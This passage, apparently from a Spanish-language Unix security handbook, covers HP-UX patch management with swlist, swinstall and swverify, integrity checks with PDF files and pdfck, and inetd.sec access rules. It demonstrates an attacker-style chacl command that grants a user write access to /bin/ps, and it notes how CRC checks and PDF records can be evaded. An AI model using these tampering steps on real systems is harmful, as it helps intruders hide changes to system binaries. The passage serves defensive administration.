&#x00A0;#&#x00A0;Accounting&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;B.10.20&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Accounting
&#x00A0;&#x00A0;&#x00A0;Accounting.ACCOUNTNG&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;B.10.20
&#x00A0;&#x00A0;&#x00A0;Accounting.ACCT-ENG-A-MAN&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;B.10.20
&#x00A0;marta:/#&#x00A0;cd&#x00A0;/var/adm/sw/products/Accounting
&#x00A0;marta:/var/adm/sw/products/Accounting/#&#x00A0;ls
&#x00A0;ACCOUNTNG&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ACCT-ENG-A-MAN&#x00A0;&#x00A0;pfiles
&#x00A0;marta:/var/adm/sw/products/Accounting/#&#x00A0;grep&#x00A0;&#x02C6;revision&#x00A0;ACC*/INDEX
&#x00A0;ACCOUNTNG/INDEX:revision&#x00A0;B.10.20
&#x00A0;ACCT-ENG-A-MAN/INDEX:revision&#x00A0;B.10.20
&#x00A0;marta:/var/adm/sw/products/Accounting/#
</literallayout>
<!--l. 353--><para>Como hemos dicho, tambi&#x00E9;n mediante la orden swlist podemos obtener un listado de los parches aplicados a
nuestro sistema HP-UX a nivel de aplicaci&#x00F3;n; de nuevo, podr&#x02CA;&#x0131;amos conseguir esta informaci&#x00F3;n accediendo
directamente a /var/adm/sw/products/:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;swlist&#x00A0;-l&#x00A0;fileset&#x00A0;-a&#x00A0;patch&#x005F;state&#x00A0;|grep&#x00A0;PH|grep&#x00A0;-v&#x00A0;&#x02C6;&#x005C;#|head&#x00A0;-3
&#x00A0;&#x00A0;&#x00A0;PHCO&#x005F;10124.PHCO&#x005F;10124
&#x00A0;&#x00A0;&#x00A0;PHCO&#x005F;10175.PHCO&#x005F;10175
&#x00A0;&#x00A0;&#x00A0;PHCO&#x005F;10272.PHCO&#x005F;10272
&#x00A0;marta:/#
</literallayout>
<!--l. 366--><para>Para obtener los parches aplicados al n&#x00FA;cleo del sistema operativo podemos utilizar la orden &#x2018;what&#x2019; sobre el
kernel de HP-UX:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;what&#x00A0;/stand/vmunix|grep&#x00A0;PH&#x00A0;|head&#x00A0;-2
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PATCH&#x005F;10.20:&#x00A0;tty&#x005F;pty.o&#x00A0;&#x00A0;1.13.112.5&#x00A0;&#x00A0;98/01/13&#x00A0;&#x00A0;PHNE&#x005F;13800
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PATCH&#x005F;10.20:&#x00A0;mux2.o&#x00A0;&#x00A0;1.8.112.5&#x00A0;&#x00A0;98/01/13&#x00A0;&#x00A0;PHNE&#x005F;13800
&#x00A0;marta:/#
</literallayout>
<!--l. 376--><para>Todos los parches o&#xFB01;ciales de HP-UX (tanto a nivel de n&#x00FA;cleo como de aplicaci&#x00F3;n) se identi&#xFB01;can por cuatro
letras que de&#xFB01;nen el tipo de parche, seguidas de un n&#x00FA;mero y separados ambos por un subrayado: por
ejemplo, como acabamos de ver, el nombre de un parche puede ser PHNE<informalequation><graphic 
fileref="unixsec238x.gif"></graphic></informalequation>13800. Actualmente existen
cuatro tipos de parches de&#xFB01;nidos por Hewlett&#x2013;Packard: comandos y librer&#x02CA;&#x0131;as (PHCO), kernel
(PHKL), red (PHNE) y subsistemas (PHSS); todos los parches comienzan con la denominaci&#x00F3;n
com&#x00FA;n PH (patch HP-UX), y el n&#x00FA;mero que los identi&#xFB01;ca es &#x00FA;nico, independientemente del tipo de
parche.
<!--br/-->
<!--br/-->Hewlett&#x2013;Packard distribuye cada cuatro meses sus parches o&#xFB01;ciales en CDROMs o cintas, denominados
Support Plus; tambi&#x00E9;n a trav&#x00E9;s de Internet podemos descargar actualizaciones y parches en la direcci&#x00F3;n
http://www.itrc.hp.com/, que nos indicar&#x00E1; la URL adecuada a la que debemos dirigirnos en funci&#x00F3;n de
nuestra ubicaci&#x00F3;n geogr&#x00E1;&#xFB01;ca (Europa, Am&#x00E9;rica&#x2026;). A diferencia de lo que sucede con otros fabricantes, en el
caso de Hewlett&#x2013;Packard es necesario estar registrado para acceder a sus parches, pero este registro es
completamente gratuito.
<!--br/-->
<!--br/-->Cuando descargamos un parche para HP-UX obtenemos un &#x00FA;nico &#xFB01;chero que no es m&#x00E1;s que un shellscript, y
para instalarlo evidentemente lo primero que tenemos que hacer es ejecutar dicho archivo; esto generar&#x00E1;
un par de &#xFB01;cheros con el nombre del parche correspondiente y extensiones .text y .depot
respectivamente <anchor 
   id="x1-179001f2"  ></anchor><footnote><para>     Recordemos que en Unix el concepto de &#x2018;extensi&#x00F3;n&#x2019; de un archivo no exite; realmente, obtendremos dos archivos con
nombres &#xFB01;nalizados en .text y .depot.</para></footnote>:
el primero de ellos contiene informaci&#x00F3;n sobre el parche (nombre, plataformas, instrucciones de instalaci&#x00F3;n&#x2026;),
mientras que el segundo es un archivo con formato TAR que podremos instalar mediante la orden
swinstall. Si por ejemplo queremos instalar el parche PHNE<informalequation><graphic 
fileref="unixsec240x.gif"></graphic></informalequation>12492 ejecutaremos una orden similar a la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;swinstall&#x00A0;-x&#x00A0;autoreboot=true&#x00A0;-x&#x00A0;match&#x005F;target=true&#x00A0;&#x005C;
&#x00A0;-s&#x00A0;./PHNE&#x005F;12492.depot&#x00A0;2&#x003E;&#x0026;1&#x00A0;&#x003E;/dev/null
&#x00A0;marta:/#
</literallayout>
<!--l. 414--><para>La opci&#x00F3;n que m&#x00E1;s nos interesa de swinstall es sin duda &#x2018;-s&#x2019;, que especi&#xFB01;ca la ubicaci&#x00F3;n del archivo .depot
en el sistema de &#xFB01;cheros; la opci&#x00F3;n &#x2018;-x autoreboot=true&#x2019; no indica obligatoriamente un reinicio del
sistema, sino que simplemente lo permite: cada parche de HP-UX &#x2018;sabe&#x2019; si para instalarse correctamente es
necesario reiniciar el operativo (nosotros lo podemos saber simplemente leyendo el &#xFB01;chero .text que
hemos generado anteriormente), y si el reboot es necesario con esta opci&#x00F3;n indicamos que se lleve a cabo
autom&#x00E1;ticamente, algo &#x00FA;til en instalaciones autom&#x00E1;ticas pero que puede ser cr&#x02CA;&#x0131;tico en algunas
ocasiones.
<!--br/-->
<!--br/-->Una vez instalado el parche correspondiente es recomendable ejecutar swverify; esta orden veri&#xFB01;ca que la
informaci&#x00F3;n registrada en la IPD de HP-UX (dependencias, integridad de archivos&#x2026;) se corresponde con la
que se encuentra en los &#xFB01;cheros y directorios del sistema. Podemos veri&#xFB01;car todos los registros de software
(productos y parches) mediante el comod&#x02CA;&#x0131;n &#x2018;<informalequation><graphic 
fileref="unixsec241x.gif"></graphic></informalequation>&#x2019;, o bien &#x00FA;nicamente el parche que acabamos de
instalar; aparte de mostrarse en la consola o terminal desde la que se ejecute, el resultado de la
ejecuci&#x00F3;n de esta orden se guardar&#x00E1; en el &#xFB01;chero de log correspondiente, dentro del directorio
/var/adm/sw/:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;swverify&#x00A0;PHNE&#x005F;12492
&#x00A0;
&#x00A0;=======&#x00A0;&#x00A0;12/11/01&#x00A0;03:23:34&#x00A0;MET&#x00A0;&#x00A0;BEGIN&#x00A0;swverify&#x00A0;SESSION
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;(non-interactive)
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;Session&#x00A0;started&#x00A0;for&#x00A0;user&#x00A0;&#x0022;root@marta&#x0022;.
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;Beginning&#x00A0;Selection
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;Target&#x00A0;connection&#x00A0;succeeded&#x00A0;for&#x00A0;&#x0022;marta:/&#x0022;.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;Software&#x00A0;selections:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PHNE&#x005F;12492.PHNE&#x005F;12492,l=/,r=B.10.00.00.AA,&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;a=HP-UX&#x005F;B.10.20&#x005F;700/800,v=HP:/
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;Selection&#x00A0;succeeded.
&#x00A0;
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;Beginning&#x00A0;Analysis
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;Session&#x00A0;selections&#x00A0;have&#x00A0;been&#x00A0;saved&#x00A0;in&#x00A0;the&#x00A0;file
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;/.sw/sessions/swverify.last&#x0022;.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;The&#x00A0;analysis&#x00A0;phase&#x00A0;succeeded&#x00A0;for&#x00A0;&#x0022;marta:/&#x0022;.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;Verification&#x00A0;succeeded.
&#x00A0;
&#x00A0;
&#x00A0;NOTE:&#x00A0;&#x00A0;&#x00A0;&#x00A0;More&#x00A0;information&#x00A0;may&#x00A0;be&#x00A0;found&#x00A0;in&#x00A0;the&#x00A0;agent&#x00A0;logfile&#x00A0;(location
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;is&#x00A0;marta:/var/adm/sw/swagent.log).
&#x00A0;
&#x00A0;=======&#x00A0;&#x00A0;12/11/01&#x00A0;03:23:40&#x00A0;MET&#x00A0;&#x00A0;END&#x00A0;swverify&#x00A0;SESSION&#x00A0;(non-interactive)
&#x00A0;
&#x00A0;marta:/#
</literallayout>
<!--l. 464--><para>Antes de &#xFB01;nalizar este punto es necesario recordar que siempre, antes de cualquier actualizaci&#x00F3;n del
sistema o de la aplicaci&#x00F3;n de cualquier tipo de parche, es imprescindible hacer una copia de
seguridad completa de todos los sistemas de &#xFB01;cheros; esto es algo que se recomienda en todos los
procedimientos de instalaci&#x00F3;n de parches o&#xFB01;ciales de Hewlett&#x2013;Packard, y que nos puede ayudar
a devolver al sistema a un estado operativo ante cualquier m&#x02CA;&#x0131;nimo problema durante una
actualizaci&#x00F3;n.
  </para></section><!--end section--><!--l. 471--><section 
role="section"><title><abbrev role="title-mark">12.5</abbrev><anchor 
   id="x1-18000012.5"  ></anchor>Extensiones de la seguridad</title>
<!--l. 472--><para>
  </para><!--l. 472--><section 
role="subsection"><title><abbrev role="title-mark">12.5.1</abbrev><anchor 
   id="x1-18100012.5.1"  ></anchor>Product Description Files</title>
<!--l. 473--><para>  HP-UX (tanto en su versi&#x00F3;n Trusted como en la habitual) posee un interesante mecanismo que nos
permite veri&#xFB01;car si ciertos &#xFB01;cheros han sido o no modi&#xFB01;cados: se trata de PDF (aqu&#x02CA;&#x0131; no signi&#xFB01;ca Portable
Document Format sino Product Description File), que no es m&#x00E1;s que un repositorio de informaci&#x00F3;n acerca de
todos y cada uno de los archivos que un determinado &#xFB01;leset instala en una m&#x00E1;quina. Aunque el uso de los
PDFs est&#x00E1; desfasado desde la versi&#x00F3;n 10.20 del operativo (ha sido sustituido por el Software Distributor), la
informaci&#x00F3;n que contienen es bastante interesante desde el punto de vista de la seguridad, ya que incluye
caracter&#x02CA;&#x0131;sticas como el grupo, el propietario, los permisos, el tama~no o un checksum de cada
archivo.
<!--br/-->

<!--br/-->En el directorio /system/ de un sistema HP-UX encontramos un subdirectorio por cada &#xFB01;leset instalado
en la m&#x00E1;quina; dentro de cada uno de estos subdirectorios existe &#x2013; o ha de existir &#x2013; un &#xFB01;chero denominado
pdf, que contiene justamente la informaci&#x00F3;n de la que estamos hablando:

     </para><literallayout role="verbatim">
&#x00A0;marta:/system/UX-CORE#&#x00A0;pwd
&#x00A0;/system/UX-CORE
&#x00A0;marta:/system/UX-CORE#&#x00A0;ls&#x00A0;-l&#x00A0;pdf
&#x00A0;-r--r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;bin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;36199&#x00A0;Jan&#x00A0;10&#x00A0;&#x00A0;1995&#x00A0;pdf
&#x00A0;marta:/system/UX-CORE#&#x00A0;head&#x00A0;pdf
&#x00A0;%&#x00A0;Product&#x00A0;Description&#x00A0;File
&#x00A0;%&#x00A0;UX-CORE&#x00A0;fileset,&#x00A0;Release&#x00A0;9.05
&#x00A0;/bin/alias:bin:bin:-r-xr-xr-x:160:1:70.2:4285122165:
&#x00A0;/bin/basename:bin:bin:-r-xr-xr-x:16384:1:70.5:3822935702:
&#x00A0;/bin/bg:bin:bin:-r-xr-xr-x:151:1:70.2:735613650:
&#x00A0;/bin/cat:bin:bin:-r-xr-xr-x:16384:1:70.2:1679699346:
&#x00A0;/bin/cd:bin:bin:-r-xr-xr-x:151:1:70.2:525751009:
&#x00A0;/bin/chgrp:bin:bin:-r-xr-xr-x:20480:1:70.2:203825783:
&#x00A0;/bin/chmod:bin:bin:-r-xr-xr-x:24576:1:70.6:1826477440:
&#x00A0;/bin/chown:bin:bin:-r-xr-xr-x:20480:1:70.2:1796648176:
&#x00A0;marta:/system/UX-CORE#
</literallayout>
<!--l. 508--><para>Como vemos, cada l&#x02CA;&#x0131;nea de este &#xFB01;chero (excepto las que comienzan con el car&#x00E1;cter &#x2018;%&#x2019;) es la
entrada correspondiente a un cierto archivo que el &#xFB01;leset instala en la m&#x00E1;quina; su formato es el
siguiente:
     </para><!--l. 512--><para>&#x2013; pathname: Ruta absoluta del &#xFB01;chero.
     <!--br/-->&#x2013; owner: Propietario (nombre o UID) del archivo.
     <!--br/-->&#x2013; group: Grupo (nombre o GID) al que pertenece.
     <!--br/-->&#x2013; mode: Tipo y permisos (en formato &#x2018;ls -l&#x2019;).
     <!--br/-->&#x2013; size: Tama~no del &#xFB01;chero en bytes.
     <!--br/-->&#x2013; links: N&#x00FA;mero total de enlaces en el &#xFB01;lesystem.
     <!--br/-->&#x2013; version: Versi&#x00F3;n del archivo.
     <!--br/-->&#x2013; checksum: Comprobaci&#x00F3;n de errores seg&#x00FA;n el algoritmo IEEE 802.3 CRC.
     <!--br/-->&#x2013; linked<informalequation><graphic 
fileref="unixsec242x.gif"></graphic></informalequation>to: Nombres adicionales del &#xFB01;chero (enlaces duros o simb&#x00F3;licos).
</para><!--l. 524--><para>Para comprobar que los archivos de un determinado &#xFB01;leset no han sufrido modi&#xFB01;caciones que afecten a
alguno de los campos anteriores podemos programar un sencillo shellscript que utilizando la salida de
&#x00F3;rdenes como &#x2018;ls -l&#x2019;, &#x2018;what&#x2019;, &#x2018;ident&#x2019; o &#x2018;cksum&#x2019; compruebe el resultado de las mismas con la
informaci&#x00F3;n almacenada en el PDF correspondiente:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;grep&#x00A0;&#x02C6;/bin/cat&#x00A0;/system/UX-CORE/pdf
&#x00A0;/bin/cat:bin:bin:-r-xr-xr-x:16384:1:70.2:1679699346:
&#x00A0;marta:/#&#x00A0;ls&#x00A0;-l&#x00A0;/bin/cat
&#x00A0;-r-xr-xr-x&#x00A0;&#x00A0;&#x00A0;1&#x00A0;bin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;16384&#x00A0;Jan&#x00A0;10&#x00A0;&#x00A0;1995&#x00A0;/bin/cat
&#x00A0;marta:/#&#x00A0;what&#x00A0;/bin/cat
&#x00A0;/bin/cat:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;$Revision:&#x00A0;1.1&#x00A0;$
&#x00A0;marta:/#&#x00A0;cksum&#x00A0;/bin/cat
&#x00A0;1679699346&#x00A0;16384&#x00A0;/bin/cat
&#x00A0;marta:/#
</literallayout>
<!--l. 544--><para>De la misma forma, podemos ejecutar la orden &#x2018;pdfck&#x2019;, que nos informar&#x00E1; de cualquier cambio detectado en
los &#xFB01;cheros de un &#xFB01;leset:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;pdfck&#x00A0;/system/UX-CORE/pdf
&#x00A0;/etc/eisa/HWP0C70.CFG:&#x00A0;deleted
&#x00A0;/etc/eisa/HWP0C80.CFG:&#x00A0;deleted
&#x00A0;/etc/eisa/HWP1850.CFG:&#x00A0;deleted
&#x00A0;/etc/eisa/HWP2051.CFG:&#x00A0;deleted
&#x00A0;/etc/eisa/HWPC000.CFG:&#x00A0;deleted
&#x00A0;/etc/eisa/HWPC010.CFG:&#x00A0;deleted
&#x00A0;/etc/eisa/HWPC051.CFG:&#x00A0;deleted
&#x00A0;/etc/newconfig/905RelNotes/hpuxsystem:&#x00A0;deleted
&#x00A0;/etc/newconfig/inittab:&#x00A0;size(848&#x00A0;-&#x003E;&#x00A0;952),&#x00A0;checksum(214913737&#x00A0;-&#x003E;&#x00A0;2198533832)
&#x00A0;/usr/lib/nls/POSIX:&#x00A0;owner(bin&#x00A0;-&#x003E;&#x00A0;root),&#x00A0;group(bin&#x00A0;-&#x003E;&#x00A0;sys)
&#x00A0;marta:/#
</literallayout>
<!--l. 562--><para>La aproximaci&#x00F3;n a los veri&#xFB01;cadores de integridad que ofrece HP-UX es interesante, pero tiene tambi&#x00E9;n
importantes carencias; en primer lugar, los algoritmos de CRC est&#x00E1;n pensados para realizar una
comprobaci&#x00F3;n de errores pura, especialmente en el tr&#x00E1;nsito de datos a trav&#x00E9;s de una red (de hecho, el
utilizado por los PDFs es el mismo que el de&#xFB01;nido por el est&#x00E1;ndar IEEE 802.3 para redes Ethernet), no
para detectar cambios en el contenido de un archivo. As&#x02CA;&#x0131;, es factible &#x2013; y no dif&#x02CA;&#x0131;cil &#x2013; que un atacante
consiga modi&#xFB01;car sustancialmente un &#xFB01;chero sin afectar a su CRC global, con lo cual este hecho no ser&#x02CA;&#x0131;a
detectado; si realmente queremos veri&#xFB01;car que dos archivos son iguales hemos de recurrir a funciones hash
como MD5. Por si esto fuera poco, pdfck es incapaz de detectar la presencia de nuevos &#xFB01;cheros en un
directorio, con lo que algo tan simple como la aparici&#x00F3;n de un archivo setuidado en el sistema no ser&#x02CA;&#x0131;a
noti&#xFB01;cado por esta utilidad; incluso ciertos cambios sobre los archivos de los cuales s&#x02CA;&#x0131; tiene
constancia pasan desapercibidos para ella, como la modi&#xFB01;caci&#x00F3;n de listas de control de acceso en los
&#xFB01;cheros:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;lsacl&#x00A0;/bin/ps
&#x00A0;(bin.%,r-x)(%.sys,r-x)(%.%,r-x)&#x00A0;/bin/ps
&#x00A0;marta:/#&#x00A0;chacl&#x00A0;&#x0022;toni.users+rwx&#x0022;&#x00A0;/bin/ps
&#x00A0;marta:/#&#x00A0;lsacl&#x00A0;/bin/ps
&#x00A0;(toni.users,rwx)(bin.%,r-x)(%.sys,r-x)(%.%,r-x)&#x00A0;/bin/ps
&#x00A0;marta:/#
</literallayout>
<!--l. 588--><para>Como vemos, la orden anterior est&#x00E1; otorgando a un usuario un control total sobre el archivo /bin/ps, con
todo lo que esto implica; evidentemente, si esto lo ha realizado un atacante, estamos ante una violaci&#x00F3;n
muy grave de nuestra seguridad. Sin embargo, pdfck ejecutado sobre el PDF correspondiente no
reportar&#x02CA;&#x0131;a ninguna anomal&#x02CA;&#x0131;a, con lo que la intrusi&#x00F3; pasar&#x02CA;&#x0131;a completamente desapercibida para el
administrador.
<!--br/-->
<!--br/-->A la vista de estos problemas, parece evidente que si necesitamos un veri&#xFB01;cador de integridad &#x2018;de verdad&#x2019;
no podemos limitarnos a utilizar las facilidades proporcionadas por los PDFs de HP-UX; no obstante, ya
que este mecanismo viene &#x2018;de serie&#x2019; con el sistema, no est&#x00E1; de m&#x00E1;s usarlo, pero sin basarnos ciegamente en
sus resultados. Siempre hemos de tener en cuenta que la informaci&#x00F3;n de cada &#xFB01;chero registrada en los
archivos /system/<informalequation><graphic 
fileref="unixsec243x.gif"></graphic></informalequation>/pdf se almacena igual que se est&#x00E1; almacenando el propio archivo, en un cierto
directorio de la m&#x00E1;quina donde evidentemente el administrador puede escribir sin poblemas. Por
tanto, a nadie se le escapa que si un atacante consigue el privilegio su&#xFB01;ciente para modi&#xFB01;car
una herramienta de base (por ejemplo, /bin/ls) y troyanizarla, no tendr&#x00E1; muchos problemas
en modi&#xFB01;car tambi&#x00E9;n el archivo donde se ha guardado la informaci&#x00F3;n asociada a la misma, de
forma que limit&#x00E1;ndonos a comparar ambas no nos daremos cuenta de la intrusi&#x00F3;n. As&#x02CA;&#x0131;, es una
buena idea guardar, nada m&#x00E1;s instalar el sistema, una copia del directorio /system/, donde est&#x00E1;n
los PDFs, en una unidad de s&#x00F3;lo lectura; cuando lleguemos al tema dedicado a la detecci&#x00F3;n de
intrusos hablaremos con m&#x00E1;s detalle de los veri&#xFB01;cadores de integridad y la importancia de esa
primera copia, sobre un sistema limpio, de toda la informaci&#x00F3;n que posteriormente vamos a
veri&#xFB01;car.
  </para></section><!--end subsection--><!--l. 614--><section 
role="subsection"><title><abbrev role="title-mark">12.5.2</abbrev><anchor 
   id="x1-18200012.5.2"  ></anchor>inetd.sec(4)</title>
<!--l. 615--><para>  Desde hace m&#x00E1;s de diez a~nos, HP-UX incorpora en todas sus releases un mecanismo de control de acceso
a los servicios que el sistema ofrece a trav&#x00E9;s de inetd; se trata de un esquema muy similar al
ofrecido por TCP Wrappers, esto es, basado en la direcci&#x00F3;n IP de la m&#x00E1;quina o red solicitante del
servicio, y procesado antes de ejecutar el demonio que va a servir la petici&#x00F3;n correspondiente. De
esta forma, se establece un nivel de seguridad adicional al ofrecido por cada uno de estos
demonios.
<!--br/-->
<!--br/-->Evidentemente, este esquema basa su con&#xFB01;guraci&#x00F3;n en un determinado archivo; el equivalente ahora a los
&#xFB01;cheros /etc/hosts.allow y /etc/hosts.deny de TCP Wrappers es /usr/adm/inetd.sec (si no existe,
el sistema funciona de la forma habitual, sin ning&#x00FA;n nivel de protecci&#x00F3;n adicional). El formato de cada l&#x02CA;&#x0131;nea
del mismo es muy simple:
</para><section role="center"><title/>
<!--l. 627--><para> servicio allow<informalequation><graphic 
fileref="unixsec244x.gif"></graphic></informalequation>deny direccion</para></section>
<!--l. 630--><para>La directiva &#x2018;servicio&#x2019; indica el nombre del servicio a proteger tal y como aparece en el archivo
/etc/services (esto es una diferencia con respecto a TCP Wrappers, que se gu&#x02CA;&#x0131;a por el nombre concreto
del demonio y no por el del servicio); &#x2018;allow&#x2019; o &#x2018;deny&#x2019; (opcionales, si no se indica este campo se asume un
&#x2018;allow&#x2019;) de&#xFB01;nen si vamos a permitir o denegar el acceso, respectivamente, y por &#x00FA;ltimo en el campo
&#x2018;direccion&#x2019; podemos indicar (tambi&#x00E9;n es un campo opcional) la direcci&#x00F3;n IP de uno o m&#x00E1;s hosts o redes,
as&#x02CA;&#x0131; como los nombres de los mismos. Si para un mismo servicio existe m&#x00E1;s de una entrada, s&#x00F3;lo se aplica la

&#x00FA;ltima de ellas; aunque a primera vista esto nos pueda parecer una limitaci&#x00F3;n importante, no lo es: si
de&#xFB01;nimos una entrada &#x2018;allow&#x2019;, a todos los sistemas no contemplados en ella se les negar&#x00E1; el
acceso, si de&#xFB01;nimos una &#x2018;deny&#x2019; se le permitir&#x00E1; a todo el mundo excepto a los expl&#x02CA;&#x0131;citamente
indicados, y si para un servicio no existe una entrada en el &#xFB01;chero, no se establece ning&#x00FA;n tipo de
control.
<!--br/-->
<!--br/-->Imaginemos que el contenido de /usr/adm/inetd.sec es el siguiente:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;grep&#x00A0;-v&#x00A0;&#x02C6;&#x005C;#&#x00A0;/usr/adm/inetd.sec
&#x00A0;finger&#x00A0;allow&#x00A0;localhost&#x00A0;158.42.*
&#x00A0;ssh&#x00A0;allow&#x00A0;localhost&#x00A0;158.42.*&#x00A0;192.168.0.*
&#x00A0;pop&#x00A0;allow
&#x00A0;marta:/#
</literallayout>
<!--l. 656--><para>En este caso lo que estamos haciendo es permitir el acceso al servicio finger a todas las m&#x00E1;quinas cuya
direcci&#x00F3;n comience por 158.42., as&#x02CA;&#x0131; como a la m&#x00E1;quina local, y negarlo al resto, permitir acceso a ssh
adem&#x00E1;s de a estas a las que tengan una direcci&#x00F3;n 192.169.0., y dejar que cualquier sistema (no
de&#xFB01;nimos el tercer campo) pueda consultar nuestro servicio POP3 (la entrada mostrada ser&#x02CA;&#x0131;a
equivalente a un indicar &#x00FA;nicamente el nombre del servicio, o a no de&#xFB01;nir una entrada para el
mismo). As&#x02CA;&#x0131;, en el momento que un sistema trate de acceder a un servicio para el que no tiene
autorizaci&#x00F3;n obtendr&#x00E1; una respuesta similar a la ofrecida por TCP Wrappers (esto es, el cierre de la
conexi&#x00F3;n):

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;158.42.2.1&#x00A0;79
&#x00A0;Trying&#x00A0;158.42.2.1...
&#x00A0;Connected&#x00A0;to&#x00A0;158.42.2.1.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~#
</literallayout>
<!--l. 677--><para>Como vemos, se trata de un mecanismo sencillo que, aunque no ofrezca el mismo nivel de protecci&#x00F3;n que un
buen cortafuegos (nos podemos &#xFB01;jar que la conexi&#x00F3;n se establece y luego se corta, en lugar de denegarse
directamente como har&#x02CA;&#x0131;a un &#xFB01;rewall), y aunque no sea tan parametrizable &#x2013; ni conocido &#x2013; como TCP
Wrappers, puede ahorrar m&#x00E1;s de un problema a los administradores de una m&#x00E1;quina HP-UX; y ya que
existe, no cuesta nada utilizarlo junto a cualquier otra medida de seguridad adicional que se nos ocurra
(recordemos que en el mundo de la seguridad hay muy pocos mecanismos excluyentes, casi todos son
complementarios). Para obtener m&#x00E1;s informaci&#x00F3;n acerca de este, podemos consultar la p&#x00E1;gina de manual de
inetd.sec(4).
  </para></section><!--end subsection--></section><!--end section--><!--l. 687--><section 
role="section"><title><abbrev role="title-mark">12.6</abbrev><anchor 
   id="x1-18300012.6"  ></anchor>El subsistema de red</title>
<!--l. 688--><para>  Igual que al hablar de Solaris o AIX hemos hecho referencia a &#x00F3;rdenes como como ndd o no, en HP-UX es
obligatorio comentar la orden nettune, que permite examinar y modi&#xFB01;car diferentes par&#x00E1;metros
del subsistema de red del operativo en HP-UX 10.x (en versiones anteriores era necesario
utilizar comandos como adb, y en HP-UX 11 se introduce la orden ndd, como veremos m&#x00E1;s
adelante, muy similar a la existente en Solaris); por ejemplo, una consulta t&#x02CA;&#x0131;pica puede ser la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;/usr/contrib/bin/nettune&#x00A0;-l
